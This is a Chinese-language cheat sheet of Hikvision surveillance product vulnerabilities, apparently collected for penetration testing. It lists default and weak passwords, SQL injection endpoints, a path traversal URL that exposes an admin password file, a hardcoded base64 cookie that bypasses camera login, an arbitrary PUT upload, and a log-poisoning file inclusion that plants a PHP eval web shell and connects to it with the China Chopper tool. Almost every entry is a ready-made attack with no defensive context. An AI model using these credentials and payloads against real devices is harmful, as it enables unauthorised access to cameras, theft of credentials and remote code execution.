## 海康威视漏洞集合
#### 默认密码
- admin：12345
- ​guest：12345
## iVMS-5000集中监控管理平台
## 漏洞类型：弱口令
## 漏洞细节
在链接`url/axis2-admin/login`
弱口令统一：admin/axis2

---
## 某备份系统
## 漏洞类型：SQL注入
## 漏洞细节

`/data/fetchPlanStatus.php`
`/data/fetchBackupPlan.php`
- 参数：row
- 数据库是sqlite

---
## 某流媒体管理系统
## 漏洞类型：任意文件遍历下载


## 漏洞细节
- 任意文件遍历下载
- `/systemLog/showFile.php?filename=./vtduConfig/index.php`
- 直接获取管理员密码：`url:7788/config/user.xml`

---
## 某款网络摄像机
## 漏洞类型：权限绕过
## 漏洞细节
- 摄像头内部固化了匿名账户，尽管大多情况下匿名账户是禁用的，仍可通过硬编码的方式绕过登陆。
- 创建一个名为“userInfo80”的cookie，路径为"/"，值为："YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw==",意思为"user:pass"的base64硬编码格式。
- ​可以登录成功

---
## iVMS-8700安防综合管理平台
##  漏洞类型：可使用PUT方法上传文件
## 漏洞细节
- PUT /1.txt http /1.1
- Host:
- content-Length: 11
- wooyun 
- 可成功

---
## 某型号监控认证绕过
##  漏洞类型：权限绕过
## 漏洞细节
- 开放554端口，rtsp,使用nmap script rtsp-url-brute
- 可利用
- ​
---
## 视频监控
## 漏洞类型：心脏滴血
## 漏洞细节
- 可读取内存的用户名和密码

---
## IVMS系列的监控客户端
## 漏洞类型：文件包含
## 漏洞细节
- `urlindex.php?controller=../../../../Server/logs/error.log%00.php`
- 访问`url/<?eval($_POST['pass'])?>`
- `/index.php?controller=../../../../Server/logs/error.log%00.php`
- 使用菜刀链接，log文件，可解析为php
- 
---
## 产品型号
## 漏洞类型
## 漏洞细节
---